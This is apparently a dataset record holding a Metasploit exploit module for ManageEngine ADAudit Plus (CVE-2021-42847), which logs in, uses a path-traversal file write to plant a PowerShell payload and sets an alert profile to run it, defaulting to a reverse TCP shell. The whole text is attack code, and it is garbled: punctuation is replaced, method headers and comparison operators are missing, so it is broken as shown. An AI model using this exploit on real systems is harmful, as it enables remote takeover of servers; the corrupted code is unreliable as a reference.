{
    "text": "vul_name : ManageEngine ADAudit Plus Remote Code Execution ， vul_cve : CVE-2021-42847 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : Remote : HTTP : ManageEngineAdauditPlus ， super (  ， update_info (  ， info ,  ， 'Name' => 'ManageEngine ADAudit Plus Authenticated File Write RCE' ,  ， 'Description' => %q{ ， This module exploits security issues in ManageEngine ADAudit Plus ， prior to 7006 that allow authenticated users to execute arbitrary ， code by creating a custom alert profile and leveraging its custom ， alert script component. ， The module first runs a few checks to test the provided ， credentials , retrieve the configured domain ( s ) and obtain the ， build number of the target ADAudit Plus server. ， If the credentials are valid and the target is ， vulnerable , the module creates an alert profile that will be ， triggered for any failed login attempt to the configured domain. ， For versions prior to build 7004 , the payload is directly inserted ， in the custom alert script component of the alert profile. ， For versions 7004 and 7005 , the module leverages an arbitrary file ， write vulnerability ( CVE-2021-42847 ) to create a Powershell script ， in the alert_scripts directory that contains the payload. The name ， of this script is then provided as the value for the custom alert ， script component of the alert profile. ， This module requires valid credentials for an account with the ， privileges to create alert scripts. It has been successfully tested ， against ManageEngine ADAudit Plus builds 7003 and 7005 running on ， Windows Server 2012 R2. ， Successful exploitation will result in RCE as the user running ， ManageEngine ADAudit Plus , which will typically be the local ， administrator. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'Moon' ,  # CVE-2021-42847 discovery ， 'Erik Wynter' #  @ wyntererik - Additional research and Metasploit module ，  ]  ,  ， ' ，  [ 'CVE' , '2021-42847' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'Privileged' => true ,  ， 'DisclosureDate' => '2021-10-01' ,  ， 'Platform' => 'win' ,  ， 'Arch' => ARCH_CMD ,  ， 'Targets' => [  ，  [  ， 'Windows Command' ,  ， { ， 'Type' => : win_cmd ,  ， 'Arch' => ARCH_CMD ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp' ， } ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DefaultOptions' => { ， 'RPORT' => 8081 ,  ， 'WfsDelay' => 5 # triggering the payload may take a bit , let's not be too hasty ， } ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ FIRST_ATTEMPT_FAIL ]  ,  # This exploit may fail on its first few attempts whilst the remote system is processing alert updates. ， 'SideEffects' => [ IOC_IN_LOGS , ARTIFACTS_ON_DISK ]  ， } ， register_options (  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'The base path to ManageEngine ADAudit Plus' , '/' ]  )  ,  ， OptString.new ( 'AUTH_DOMAIN' ,  [ true , 'ADAudit Plus authentication domain ( default is ADAuditPlus Authentication ) ' , 'ADAuditPlus Authentication' ]  )  ,  ， OptString.new ( 'USERNAME' ,  [ true , 'Username to authenticate with' , 'admin' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'Password to authenticate with' , 'admin' ]  )  ,  ，  ]  )  ， end ， def auth_domain ， datastore [ 'AUTH_DOMAIN' ]  ， end ， def username ， datastore [ 'USERNAME' ]  ， end ， def password ， datastore [ 'PASSWORD' ]  ， end ， print_status ( \"Attempting to delete alert profile # { @ alert_name}\" )  ，  # let's try and get the the ID of the alert we want to delete ， res_get_alert = send_request_cgi ( { ， 'uri' => normalize_uri ( target_uri.path , 'api' , 'json' , 'leftTrees' , 'getLeftTreeList' )  ,  ， 'method' => 'POST' ,  ， 'keep_cookies' => true ,  ， 'vars_post' => { ， 'TAB_ID' => '5' ,  # this cannot be randomized ， 'adapcsrf' => adapcsrf_cookie ， } ， } )  ， unless res_get_alert ， print_warning ( \"Connection failed when attempting to obtain the alert profile ID # { @ alert_name}. Manual cleanup required.\" )  ， end ， unless res_get_alert.code = 200 ! res_get_alert.body.empty? ， print_warning ( \"Received unexpected reply when attempting to obtain the alert profile ID # { @ alert_name}. Manual cleanup required.\" )  ， end ， alert_id = res_get_alert.body&.scan ( /modelId\" :  ( \\d+ )  , \"name\" : \" # { @ alert_name}/ ) &.flatten&.first ， print_warning ( \"Failed to obtain the alert profile ID # { @ alert_name}. Manual cleanup required.\" )  ， end ，  # delete the alert ， res_delete_alert = send_request_cgi ( { ， 'uri' => normalize_uri ( target_uri.path , 'api' , 'json' , 'config' , 'alertprofiles' , 'delete' )  ,  ， 'method' => 'POST' ,  ， 'keep_cookies' => true ,  ， 'vars_post' => { ， 'data' => { 'ids' => [ alert_id ] }.to_json ,  ， 'adapcsrf' => adapcsrf_cookie ， } ， } )  ， unless res_delete_alert ， print_warning ( \"Connection failed when attempting to delete alert profile # { @ alert_name}. Manual cleanup required.\" )  ， end ， unless res_delete_alert.code = 200 res_delete_alert.body&.include? ( 'Successfully deleted the alert profile' )  ， print_warning ( \"Received unexpected reply when attempting to delete alert profile # { @ alert_name}. Manual cleanup required.\" )  ， end ， print_good ( \"Successfully deleted alert profile # { @ alert_name}\" )  ， end ， def create_alert_profile ， print_status ( 'Attempting to authenticate again in order to retrieve the required cookies.' )  ，  # We have to authenticate again in order to get the required cookie , so reset the cookie cache ， cookie_jar.clear ， login_results = adaudit_plus_login ( auth_domain , username , password , true )  ， login_msg = login_results [ 'message' ]  ， case login_results [ 'status' ]  ， when adaudit_plus_status : CONNECTION_FAILED ， fail_with ( Failure : Unreachable , login_msg )  ， when adaudit_plus_status : UNEXPECTED_REPLY ， fail_with ( Failure : UnexpectedReply , login_msg )  ， when adaudit_plus_status : NO_ACCESS ， fail_with ( Failure : NoAccess , login_msg )  ， when adaudit_plus_status : SUCCESS ，  # just to distinguish it from any other potential statuses this method may return in the future ，  # this covers other potential statuses that this method may return in the future ，  # note that here the login method should never return adaudit_plus_status : NO_DOMAINS ，  # however , if it would do so due to some library change , treating it as an unknown failure makes sense ， fail_with ( Failure : Unknown , login_msg )  ， end ，  # Code must have been a success related code so we should have ，  # an adapcsrf_cookie entry within the login results hash. ，  @ adapcsrf_cookie = login_results [ 'adapcsrf_cookie' ]  ， end ， print_status ( 'Attempting to create an alert profile' )  ，  # visit /api/json/jsMessage to see if we're dealing with 7003 or lower ， res_check_7004 = send_request_cgi ( { ， 'uri' => adaudit_api_js_message_uri ,  ， 'method' => 'POST' ,  ， 'keep_cookies' => true ,  ， 'vars_post' => { 'adapcsrf' => @ adapcsrf_cookie } ， } )  ， unless res_check_7004 ， fail_with ( Failure : Unreachable , 'Connection failed when trying to get the required info via /api/json/jsMessage' )  ， end ， unless res_check_7004.code = 200 res_check_7004.body&.include? ( 'adap_common_script_info' )  ， fail_with ( Failure : UnexpectedReply , 'Received unexpected response when trying to get the required info via /api/json/jsMessage' )  ， end ， alert_script_7004_msg = 'Your alert profile script path configuration is not compliant with the constraints listed below and needs to '\\ ， 'be changed. These constraints have been introduced in the latest build of ADAudit Plus 7004 , to enhance security' ，  # we are dealing with 7004 or higher , so exploitation can only succeed if the target is vulnerable to CVE-2021-42847 ， unless @ exploit_method = 'cve_2021_42847' ，  # let's check for the CVE-2021-42847 endpoint in case the user has disabled autocheck ， gpo_watcher_status = gpo_watcher_data_check ，  @ exploit_method = 'cve_2021_42847' ， fail_with ( Failure : NotVulnerable , 'The target is build 7004 or up and not vulnerable to CVE-2021-42847. Exploitation is not possible.' )  ， end ，  # here we have to authenticate again in order to get the required adapcsrf cookie ， cookie_jar.clear ， login_results = adaudit_plus_login ( auth_domain , username , password , true )  ， login_msg = login_results [ 'message' ]  ， case login_results [ 'status' ]  ， when adaudit_plus_status : CONNECTION_FAILED ， fail_with ( Failure : Unreachable , login_msg )  ， when adaudit_plus_status : UNEXPECTED_REPLY ， fail_with ( Failure : UnexpectedReply , login_msg )  ， when adaudit_plus_status : NO_ACCESS ， fail_with ( Failure : NoAccess , login_msg )  ， when adaudit_plus_status : SUCCESS ，  # just to distinguish it from any other potential statuses this method may return in the future ， fail_with ( Failure : Unknown , login_msg )  ， end ，  @ adapcsrf_cookie = login_results [ 'adapcsrf_cookie' ]  ， end ，  # We need to leverage CVE-2021-42847 to create a PowerShell script in /alert_scripts and then use the script name ，  # when creating the alert profile. Therefore call the function to create this alert script and save the name of the ，  # script location. ，  @ ps1_script_name = create_alert_script ， end ，  # save the alert profile ，  @ alert_name , alert_data = alert_profile_info ， res_save_alert = send_request_cgi ( { ， 'uri' => adaudit_api_alertprofiles_save_uri ,  ， 'method' => 'POST' ,  ， 'keep_cookies' => true ,  ， 'vars_post' => { ， 'data' => alert_data ,  ， 'adapcsrf' => @ adapcsrf_cookie ， } ， } )  ， unless res_save_alert ， fail_with ( Failure : Unreachable , \"Connection failed when trying to create an alert profile via # {adaudit_api_alertprofiles_save_uri}\" )  ， end ， unless res_save_alert.code = 200 res_save_alert.body&.include? ( 'Successfully Saved the Alert Profile' )  ， print_error ( \"The server sent the following response :  # {res_save_alert.body&.strip}\" )  ，  @ alert_name = nil # if we are here the alert profile was not created so let's skip cleanup by setting @ alert_name to nil ， fail_with ( Failure : UnexpectedReply , \"Failed to create an alert profile via # {adaudit_api_alertprofiles_save_uri}\" )  ， end ， print_good ( \"Successfully created alert profile # { @ alert_name}\" )  ， end ， def alert_profile_info ， script_location = @ ps1_script_name | payload.encoded ， alert_name = rand_text_alphanumeric ( 8.12 )  ， alert_data = { ， 'alertName' => alert_name ,  ， 'alertDescription' => rand_text_alpha ( 20.30 )  ,  ， 'alertSeverity' => '1' ,  ， 'alertMsg' => '%FORMAT_MESSAGE%' ,  ， 'alertIsMailNotify' => false ,  ， 'alertIsSMSNotify' => false ,  ， 'monitorList' => [ 1 ]  ,  ， 'selectedCategory' => 'All' ,  ， 'domainName' => @ domain ,  ， 'isSave' => true ,  ， 'alertProfileId' => 'new' ,  ， 'thresholdBasedAlert' => false ,  ， 'thresholdCount' => rand ( 5.15 )  ,  ， 'thresholdPeriod' => '=' ,  ， 'thresholdInterval' => rand ( 3.10 )  ,  ， 'thresholdGroupingColumns' => [  ]  ,  ， 'throttleBasedAlert' => false ,  ， 'throttleInterval' => rand ( 30.90 )  ,  ， 'throttleGroupingColumns' => [  ]  ,  ， 'userMap' => {} ,  ， 'hourBasedAlert' => false ,  ， 'contentType' => 'html' ,  ， 'alertMsgNeeded' => true ,  ， 'alertProfileNameNeeded' => true ,  ， 'mailAlertLink' => ' ,  ， 'eventDetails' => true ,  ， 'emailMoreRecipients' => ' ,  ， 'smsMoreRecipients' => ' ,  ， 'scriptLocation' => script_location ,  ， 'alertFilter' => false ,  ， 'criteriaValue' => '-' ， }.to_json ，  # we need to send along the alert name too since we'll need it to delete the alert after it's been created ，  [ alert_name , alert_data ]  ， end ， def create_alert_script ， ps1_script_name = \" # {rand_text_alpha_lower ( 5.10 ) }.ps1\" ， print_status ( \"Attempting to write the payload to /alert_scripts/ # {ps1_script_name}\" )  ，  @ domain = \" # {rand_text_alpha_lower ( 5.10 ) }.local\" ， vprint_status ( \"Using domain # { @ domain} for the name of the directory we will be creating\" )  ， end ， gpo_post_data = { ， 'DOMAIN_NAME' => @ domain ,  ， 'Html_fileName' => \".\\.\\.\\.\\.\\alert_scripts\\ # {ps1_script_name}\" ,  # the traversal path to alert_scripts should always be correct no matter where ADAudit Plus is installed ， 'htmlReport' => payload.encoded ， } ， res = send_request_cgi ( { ， 'method' => 'POST' ,  ， 'uri' => adaudit_plus_gpo_watcher_data_uri ,  ， 'ctype' => 'application/json' ,  ， 'data' => generate_gpo_watcher_data_json ( gpo_post_data )  ， } )  ， unless res ， fail_with ( Failure : Unreachable , 'Connection failed' )  ， end ， unless res.code = 200 res.body&.include? ( '{\"success\" : true}' )  ， fail_with ( Failure : UnexpectedReply , 'Failed to upload the payload.' )  ， end ， print_good ( \"Successfully wrote the payload to /alert_scripts/ # {ps1_script_name} in the ManageEngine ADAudit Plus install directory\" )  ， ps1_script_name ， end ， def check ， target_check_results = adaudit_plus_target_check ， target_check_msg = target_check_results [ 'message' ]  ， case target_check_results [ 'status' ]  ， when adaudit_plus_status : CONNECTION_FAILED",
    "time": "2023.05.09"
}